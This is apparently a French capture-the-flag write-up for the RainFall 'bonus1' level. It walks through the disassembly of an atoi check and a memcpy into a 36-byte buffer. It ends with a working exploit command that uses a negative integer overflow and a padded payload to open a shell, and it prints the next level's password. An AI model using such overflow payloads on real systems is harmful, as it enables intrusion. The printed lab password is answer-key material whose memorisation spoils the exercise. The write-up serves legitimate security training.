On remarque un atoi suivis d'un check de notre premier argument afin de de continuer seulement si notre premier argument est inférieur ou égal à 9.

```bash
 8048438:	e8 23 ff ff ff       	call   8048360 <atoi@plt>
 804843d:	89 44 24 3c          	mov    %eax,0x3c(%esp)
 8048441:	83 7c 24 3c 09       	cmpl   $0x9,0x3c(%esp)
 8048446:	7e 07                	jle    804844f <main+0x2b>
```

Cela est suivi d'une comparaison entre le résultat atoi et la valeur `1464814662`.

```bash
 8048478:	81 7c 24 3c 46 4c 4f 	cmpl   $0x574f4c46,0x3c(%esp)
```

Nous observons que la taille du buffer est 36. On peut duper le atoi en mettant un nombre négatif étant qu'il multiplie se nombre par 4.
Nous mettons aux atoi un nombre qui multiplié par 4 fait plus de 10. En deuxième argument nous insérons la valeur `1464814662` en haxadécimal.

```bash
 8048464:	8d 44 24 14          	lea    0x14(%esp),%eax
 8048468:	89 4c 24 08          	mov    %ecx,0x8(%esp)
 804846c:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048470:	89 04 24             	mov    %eax,(%esp)
 8048473:	e8 a8 fe ff ff       	call   8048320 <memcpy@plt>
 8048478:	81 7c 24 3c 46 4c 4f 	cmpl   $0x574f4c46,0x3c(%esp)
```

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "a" * 40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
